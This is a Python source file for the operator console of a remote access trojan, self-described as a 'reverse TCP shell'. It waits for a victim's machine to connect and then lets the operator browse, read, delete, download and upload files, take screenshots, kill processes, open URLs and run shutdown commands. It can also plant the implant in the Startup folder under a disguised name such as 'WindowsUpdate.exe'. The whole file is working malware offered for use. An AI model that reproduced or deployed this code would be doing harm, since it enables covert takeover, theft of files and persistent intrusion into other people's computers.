#!/usr/bin/env python
##############################################################
#----------Made by TAMT , Read licenses before using---------#
##############################################################


#-------------------import important library----------------#
from __future__ import print_function
import socket
import os
from base64 import *
import time
import pyscreenshot as ImageGrab
import sys



st = b64encode('123EnDs123')

class color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def closeConnection(s):
    print(color.FAIL + "\n[*] Good Luck\n[*] bye!" + color.ENDC)
    sys.exit(0)
    try:
        s.close()
    except Exception as e:
        pass

def sendImg(name,s,size):
    global st

    en = ''
    with open(name , 'rb') as f:
        en = f.read()
        print('[*] Reading File')

    time.sleep(2)
    s.send(str(en[-50:]))
    time.sleep(2)
    s.sendall(en)

    time.sleep(1)

    while True:
        x = s.recv(1024)
        if x == 'uploaded':
            print(color.OKGREEN + '[*] File uploaded' + color.ENDC)
            print('[*] done!\n[*] Uploaded.')
            break

#-----------------------------------------------------------#

def GetImage(name , s):

    All = ''
    ends = ''
    f = open('download_' + name,'wb')

    ends = s.recv(1024)
    print('[*] Receiving data...')
    while True:
        data = s.recv(1024)
        All += data
        if str(data).endswith(ends) or str(data) == ends:
            break

    f.write(All)

    f.close()

    print('[*] done!')
    if sys.platform == 'Linux' or sys.platform == 'linux2':
        print(color.OKGREEN + '[*] saved at: ' + os.getcwd() + '/' + 'download_' + name +'\n'+ color.ENDC)
    else:
        print(color.OKGREEN + '[*] saved at: ' + os.getcwd() +'\\' +'download_'+ name + '\n' + color.ENDC)

    All = ''
    time.sleep(0.5)


def Upload(s,data,string,From):


    f = os.path.isfile(data[From:])

    print('[*] File : ' + color.OKGREEN + str(data[From:]) + color.ENDC)

    if f == True:
        s.send(data)
        time.sleep(1)
        s.send('true')
        print('[*] File exists\n[*] Uploading...')
        size = os.path.getsize(data[7:])

        sendImg(data[7:],s,size)
    else:
        print('[!] ' + str(data[7:]) + ' does not exists.')

#-----------------------------------------------------------#

def createAll(port):
    global st
    global startup
    global name

    print(color.OKGREEN + '\n\n[*] connected in port : ' + str(port) + color.ENDC)
    print(color.OKGREEN + "\n[*] For the help menu type 'menu' or '?'\n\n\n\n\n\n\n\n"+ color.ENDC)

    loca = s.recv(1024) + ' > '
    time.sleep(1)

    if str(startup) == 'True':
        s.send('startup' + name)
        log = s.recv(1024)
        print(str(log))
    else:
        s.send('Nostartup')

    time.sleep(1)
    print('\n')
    while True:

        try:

            data = raw_input(color.FAIL + loca + color.ENDC)
        except KeyboardInterrupt:
            print("\n[*] Good Luck\n[*] bye!")
            sys.exit(0)
            s.close()
            break

        if len(str(data).strip()) > 0:

            if 'menu' in data[:4] or '?' in data[0:1]:
                print('\n\n              TAMT | reverse TCP shell\n\n'
                   '~ say <text> - Makes victim pc to say whatever you want .\n'
                   '~ cd <dir> - Navigate in his directory\n'
                   '~ os <commend> - makes system commends that do not return any data back \n'
                   '~ TASKLIST - shows the programs that run in the background\n'
                   '~ pkill <program name> - kill the program you want\n'
                   '~ cat <Text-File> - print the text of  a file on console\n'
                   '~ exit - exit all | close connection\n'
                   '~ rm - for deleting | removing file or folder\n'
                   '~ hostname - get the username of the victim\n'
                   '~ dir (or) ls - list all the files in a directory\n'
                   '~ url <link> - opens in a victim browser the url you typed\n'
                   '~ download <file> - download from the victim the file you want\n'
                   "~ upload <file> - upload the file you want to victims' PC\n"
                   "~ info - gets the OS name you're in\n"
                   "~ screen <name> - gets the screen shot of victims' pc\n"
                   "~ run <file name> - It will open the file in victims' PC\n"
                   '~ <anything else> - returns value from the CMD of a victim\n'
                   +color.FAIL + '\n\n[**] example usage - \n' +color.ENDC+color.OKGREEN +
                   '    [*] say You have been hacked\n'
                   '    [*] cd C:\Users\user\Desktop\n'
                   '    [*] os shutdown -s -t 300\n' + color.ENDC)
            elif data[:4].strip().lower() == 'exit' or data[:4].strip().lower() == 'quit':
                s.send('exit')
                print('[*] exiting')
                time.sleep(1)
                s.close()
                sys.exit(0)
                break

            elif data[:3] == 'cat':
                s.send(data)
                All = ''

                while True:
                    Data = s.recv(1024 * 20)

                    if Data.endswith(st):
                        All += Data[:-len(st)]
                        break
                    else:
                        All += Data

                print('\n' + str(All).decode('utf-8','ignore'),end='')


                print('\n\n'
                      '#--------------------------------------------------------#'
                      '                          done!                           '
                      '#--------------------------------------------------------#\n')

            elif data[:6] == 'screen':
                if data[7:] == '':
                    print('[~] screen <name>.png \n     example - screen ScreenShot.png\n')
                else:
                    if data.endswith('.png') or data.endswith('.jpg'):

                        s.send(data)
                    else:
                        data = data + '.png'
                        s.send(data)
                    time.sleep(1)
                    print('[*] downloading...')
                    GetImage(data[7:],s)

            elif data[:7] == 'upload ':
                Upload(s,data,data[:6],7)

            elif data[:2] == 'cd':
                s.send(data)
                CD = s.recv(2048)
                if str(CD).strip().startswith('Error123END123'):
                    print('[!]' + str(CD)[len("Error123END123"):-len('123END123')])
                else:
                    loca = str(CD[:-10] + ' > ')

            elif data[:8].lower() == 'download':
                s.send(data.lower())
                check_if_file = s.recv(1024)

                if(check_if_file == 'true'):
                    print('[*] File exists\n[*] downloading...')
                    name = os.path.basename(data[9:])

                    GetImage(name,s)
                else:
                    print(color.FAIL + '[!] ' + data[9:] + ' does not exists' + color.ENDC)

            else:
                s.send(data)
                if str(data[:-3]).strip().lower() == "dir" or str(data[:-2]).strip().lower() == 'ls':
                    while True:
                        recv = s.recv(1024*200)
                        if not recv or recv.endswith(st) or recv == st:
                            break

                        print(str(recv).decode('utf-8','ignore'))
                else:

                    All = ''

                    while True:
                        try:
                            that = s.recv(1024 * 200)
                        except KeyboardInterrupt:
                            break

                        if that.endswith(st):
                            All += that[:-len(st)]
                            break
                        else:
                            All += that

                    print(str(All).decode('utf-8','ignore'))


def login():
    global s
    global port

    print("\n\nEnter The Password : ")
    for tries in range(3):
        try:
            pwd = raw_input(color.FAIL + " > " + color.ENDC)
        except KeyboardInterrupt:
            closeConnection(s)

        s.send(pwd)
        log = s.recv(1024)

        if (log == "Login Successfully"):
            print("\n" +color.OKGREEN + "[*] Login Successfully" +color.ENDC + "\n")
            time.sleep(1)
            createAll(port)
            break
    s.close()
    sys.exit(0)

def error():
    print ("""[!] ./Hacker.py <Host> <Port> (<Ture>/<False> - Default) <name.exe>""")
    print("\n[#] <Host> - The host to listen on\n[#] <Port> - The port to listen on\n[#] <True> or <False>- ask if after the connection to put the file in StartUp folder,True means yes and False means no.\n[#] <name> - if you chose True then put a name for it " + color.FAIL + "(ex: WindowsUpdate.exe)" + color.ENDC + ".\n")
    print("\n" + color.OKGREEN + """[#] Example: 'python Hacker.py 127.0.0.1 6464 True WindowsUpdate.exe'""" + color.ENDC+  "\n[*] Good Luck\n[*] bye!""")
    sys.exit(0)
    s.close()

def Startconnection():
    global s
    global port
    global startup
    global name

    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
        startup = sys.argv[3]
        if startup == 'True':
            name = sys.argv[4]
    except IndexError:
        error()
    if str(startup).strip() == '':
        name = "False"
    Socket.bind((str(host),int(port)))
    Socket.listen(1)
    print(color.FAIL + '[*] Listening for connect to host :' + host +'\n[*] Listening for connect to port : ' + str(port) + ' \n[*] Waiting for connection..' + color.ENDC)
    try:
        s,(ip,port) = Socket.accept()
    except KeyboardInterrupt:
        closeConnection("no")
    login()
def StartUp():
    print ( color.OKGREEN + '$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$\n'
            '$                                 /$$                 /$$                       /$$$$$$$$  /$$$$$$  /$$      /$$ /$$$$$$$$\n'
            '$                                | $$                | $$                      |__  $$__/ /$$__  $$| $$$    /$$$|__  $$__/\n'
            '$   /$$$$$$/$$$$   /$$$$$$   /$$$$$$$  /$$$$$$       | $$$$$$$  /$$   /$$         | $$   | $$  \ $$| $$$$  /$$$$   | $$   \n'
            '$  | $$_  $$_  $$ |____  $$ /$$__  $$ /$$__  $$      | $$__  $$| $$  | $$         | $$   | $$$$$$$$| $$ $$/$$ $$   | $$   \n'
            '$  | $$ \ $$ \ $$  /$$$$$$$| $$  | $$| $$$$$$$$      | $$  \ $$| $$  | $$         | $$   | $$__  $$| $$  $$$| $$   | $$   \n'
            '$  | $$ | $$ | $$ /$$__  $$| $$  | $$| $$_____/      | $$  | $$| $$  | $$         | $$   | $$  | $$| $$\  $ | $$   | $$   \n'
            '$  | $$ | $$ | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$      | $$$$$$$/|  $$$$$$$         | $$   | $$  | $$| $$ \/  | $$   | $$   \n'
            '$  |__/ |__/ |__/ \_______/ \_______/ \_______/      |_______/  \____  $$         |__/   |__/  |__/|__/     |__/   |__/   \n'
            '$                                                               /$$  | $$                                                 \n'
            '$                                                              |  $$$$$$/                                                 \n'
            '$                                                               \______/                                                  \n$\n'
            '$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n\n' + color.ENDC)
    Startconnection()
StartUp()
